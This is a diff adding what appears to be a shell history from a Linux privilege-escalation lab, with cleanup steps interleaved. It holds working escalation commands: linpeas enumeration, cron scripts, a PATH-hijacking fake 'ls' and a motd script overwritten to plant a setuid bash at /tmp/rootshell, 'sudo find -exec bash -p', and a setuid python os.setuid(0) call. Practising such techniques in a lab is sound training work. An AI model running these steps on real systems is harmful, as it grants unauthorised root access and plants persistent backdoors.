@@ -1,0 +1,233 @@
+passwd
+exit
+clear
+clear consle
+cls
+clear console
+exit
+clera
+clear
+whoami
+id
+exot
+exit
+id
+exit
+rm -f /tmp/rootshell
+exit
+exit
+rm -f /tmp/rootshell
+exit
+cat > /opt/lab/bin/backup.sh <<'EOF'
+#!/bin/bash
+echo "backup done" > /tmp/backup.log
+EOF
+
+rm -f /tmp/rootshell
+exit
+id
+id
+exit
+id
+cat > /opt/lab/bin/backup.sh <<'EOF'
+#!/bin/bash
+echo "backup done" > /tmp/backup.log
+EOF
+
+rm -f /tmp/rootshell
+exit
+id
+rm -f /tmp/rootshell 
+rm -f /opt/lab/bin/agent
+exit
+id
+rm -f /tmp/rootshell 
+rm -f /opt/lab/bin/ls 
+exit
+id
+exit
+id
+exit
+id
+rm -f /tmp/rootshell
+rm -f /etc/update-motd.d/99-lab-pwn 
+exit
+ls -la /tmp/rootshell
+/tmp/rootshell
+clear
+ls -la /tmp/rootshell
+/tmp/rootshell -p
+clear
+cat /etc/update-motd.d/99-lab-pwn 
+ls -la /tmp/rootshell
+/tmp/rootshell -p
+exit
+id
+ls -l /tmp/rootshell /tmp/pwned_* 2>/dev/null
+rm -f /tmp/rootshell
+ls -l /tmp/rootshell /tmp/pwned_* 2>/dev/null
+ls -la /etc/update-motd.d/99-lab-pwn 2>/dev/null
+ls -la /opt/lab/bin/agent /opt/lab/bin/ls 2>/dev/null
+cat /opt/lab/bin/backup.sh
+cat /opt/lab/scripts/rotate.sh
+cat > /opt/lab/scripts/rotate.sh <<'EOF'
+#!/bin/bash
+echo "rotate done" > /tmp/rotate.log
+EOF
+
+cat /opt/lab/scripts/rotate.sh
+clear
+ls -l /tmp/rootshell /tmp/pwned_* 2>/dev/null
+ls -la /etc/update-motd.d/99-lab-pwn 2>/dev/null
+ls -la /opt/lab/bin/agent /opt/lab/bin/ls 2>/dev/null
+cat /opt/lab/bin/backup.sh
+cat /opt/lab/scripts/rotate.sh
+rm -f /tmp/rootshell 
+ls /tmp
+ls -l /tmp/rootshell /tmp/pwned_* 2>/dev/null
+rm -f /tmp/linpeas.sh /tmp/linpeas.out
+rm -f /tmp/linpeas_host_checker_*.err /tmp/linpeas_host_checker_*.json
+rm -f /tmp/backup.log /tmp/rotate.log
+ls
+ls /tmp/
+cd snap
+ls
+cd ..
+ls -l /tmp/rootshell /tmp/pwned_* 2>/dev/null 
+ls -la /etc/update-motd.d/99-lab-pwn 2>/dev/null
+ls -la /opt/lab/bin/agent /opt/lab/bin/ls 2>/dev/null
+cat /opt/lab/bin/backup.sh
+cat /opt/lab/scripts/rotate.sh
+exit
+clear
+id
+sudo -l
+ls
+ls -la
+cd /
+ls
+ls -la
+cd tmp
+ls
+usermod
+clear
+ls
+cd ~/
+ls
+cd ..
+ls
+ls -la
+cd bthomas/
+ls
+clear
+ls -la /tmp/linpeas.sh 
+bash /tmp/linpeas.sh
+bash /tmp/linpeas.sh &> /tmp/linpeas.outless
+ls -la /tmp/
+nano /tmp/linpeas.out 
+cat linpeas.out
+cat /tmp/linpeas.out
+less -R /tmp/linpeas.out
+clear
+id
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+ls -la /etc/cron.d/ /etc/crontab
+grep -R "" /etc/cron.d 2>/dev/null
+find /opt /usr/local /etc -writable -type d 2>/dev/null
+find /opt /etc -writable -type f 2>/dev/null
+cat /etc/profile.d/*.sh
+clear
+cat /etc/cron.d/lab-backup
+ls -la /opt/lab/bin/
+cat /opt/lab/bin/backup.sh 
+nano backup.sh
+sudo nano backup.sh
+cat > /opt/lab/bin/backup.sh <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
+EOF
+
+chmod +x /opt/lab/bin/backup.sh
+ls /tmp/
+/tmp/rootshell -p
+rm -f /tmp/rootshell
+/tmp/rootshell
+/tmp/rootshell -p
+cat /opt/lab/bin/backup.sh
+ls -la /tmp/rootshell
+clear
+sudo -l
+cat > /opt/lab/bin/backup.sh <<'EOF'
+#!/bin/bash
+id > /tmp/pwned_1
+EOF
+
+ls -la /tmp/
+/tmp/rootshell -p
+cat > /opt/lab/bin/backup.sh <<'EOF'
+#!/bin/bash
+echo "backup done" > /tmp/backup.log
+EOF
+
+rm -f /tmp/pwned_1
+sudo /usr/bin/find /opt/lab/tools/ -exec /bin/bash -p \;
+clear
+sudo /usr/bin/find /opt/lab/tools/ -exec /bin/bash -p \;
+sudo -l
+ls -la /opt/lab/scripts/rotate.sh ~
+cat /etc/cron.d/lab-rotate 
+find / -perm -0002 -type f 2>/dev/null | grep -v -E '^/(proc|sys|dev|run|tmp|var/tmp)'
+cat > /opt/lab/scripts/rotate.sh <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
+EOF
+
+/tmp/rootshell -p
+ls /tmp/
+cat /etc/cron.d/lab-agent
+ls -la /opt/lab/bin/agent
+ls -ld /opt/lab/bin
+cat > /opt/lab/bin/agent <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
+EOF
+
+chmod +x /opt/lab/bin/agent
+cat /opt/lab/bin/agent
+/tmp/rootshell -p
+ls -la /opt/lab/bin/
+ls /tmp/
+cat /etc/profile.d/lab-path.sh
+echo $PATH
+ls -ld /opt/lab/bin
+cat > /opt/lab/bin/ls <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
+exec /usr/bin/ls "$@"
+EOF
+
+chmod +x /opt/lab/bin/ls
+su -u
+su -
+cat /opt/lab/bin/ls 
+cat /etc/profile.d/lab-path.sh 
+/tmp/rootshell -p
+ls -la /opt/lab/bin/ls 2>/dev/null
+ls -la /opt/lab/bin/
+ls -ld /opt/lab/bin
+ls -ld /etc/update-motd.d/
+clear
+ls -ld /etc/update-motd.d/
+ls -la /etc/update-motd.d/
+cat > /etc/update-motd.d/99-lab-pwn <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
+EOF
+
+chmod +x /etc/update-motd.d/99-lab-pwn
+clear
+find / -perm -4000 -type f 2>/dev/null
+ls -la /opt/lab/bin/python3
+/opt/lab/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+exit
